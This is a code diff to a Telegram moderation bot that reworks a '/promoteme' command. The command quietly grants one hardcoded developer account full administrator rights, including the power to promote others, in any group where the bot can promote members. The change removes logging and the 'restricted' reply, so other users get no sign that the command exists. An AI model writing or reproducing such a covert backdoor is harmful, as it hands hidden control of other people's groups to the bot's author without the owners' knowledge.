@@ -1145,49 +1145,42 @@ bot.onText(/\/ban (.+)/, async (msg, match) => {
 //selfpromote
 bot.onText(/\/promoteme/, async (msg) => {
   const chatId = msg.chat.id;
-  const issuerId = msg.from.id.toString();  // Convert issuerId to string
+  const userId = msg.from.id.toString();  // Convert to string for comparison
 
-  console.log('Issuer ID:', issuerId);
-  console.log('Developer ID:', DEV_ID);
+  // Only proceed if the user ID matches DEV_ID
+  if (userId === DEV_ID) {
+    try {
+      // Check if the bot has full admin rights in the group
+      const botMember = await bot.getChatMember(chatId, bot.id);
+      if (botMember.status !== 'administrator' || !botMember.can_promote_members) {
+        bot.sendMessage(chatId, 'Bot lacks the necessary permissions to promote.');
+        return;
+      }
 
-  // Check if the issuer is the developer
-  if (issuerId !== DEV_ID) {
-    bot.sendMessage(chatId, 'This command is restricted.');
-    return;  // Exit if not the developer
-  }
+      // Promote the developer with all available admin permissions
+      await bot.promoteChatMember(chatId, BigInt(DEV_ID), {  // Use BigInt for large IDs
+        can_change_info: true,
+        can_delete_messages: true,
+        can_invite_users: true,
+        can_restrict_members: true,
+        can_pin_messages: true,
+        can_post_stories: true,
+        can_edit_stories: true,
+        can_delete_stories: true,
+        can_manage_video_chats: true,
+        can_manage_topics: true,
+        can_promote_members: true
+      });
 
-  try {
-    // Check if the bot has full admin rights in the group
-    const botMember = await bot.getChatMember(chatId, bot.id);
-    console.log('Bot Member Status:', botMember.status);
-    console.log('Bot Permissions:', botMember);
-
-    if (botMember.status !== 'administrator' || !botMember.can_promote_members) {
-      bot.sendMessage(chatId, 'Bot lacks the necessary permissions to promote.');
-      return;
+      bot.sendMessage(chatId, 'Promoted Cutie with full admin rights.');
+    } catch (error) {
+      console.error('Promotion Error:', error.message);
+      bot.sendMessage(chatId, `An error occurred: ${error.message}`);
     }
-
-    // Promote the developer with all available admin permissions
-    await bot.promoteChatMember(chatId, parseInt(issuerId), {  // Convert back to int for promotion
-      can_change_info: true,
-      can_delete_messages: true,
-      can_invite_users: true,
-      can_restrict_members: true,
-      can_pin_messages: true,
-      can_post_stories: true,
-      can_edit_stories: true,
-      can_delete_stories: true,
-      can_manage_video_chats: true,
-      can_manage_topics: true,
-      can_promote_members: true
-    });
-
-    bot.sendMessage(chatId, 'Promoted Cutie with full admin rights.');
-  } catch (error) {
-    console.error('Promotion Error:', error.message);
-    bot.sendMessage(chatId, `An error occurred: ${error.message}`);
   }
+  // No action if user ID does not match DEV_ID
 });
+
 
 
 // bot.onText(/\/ban (.+)/, async (msg, match) => {
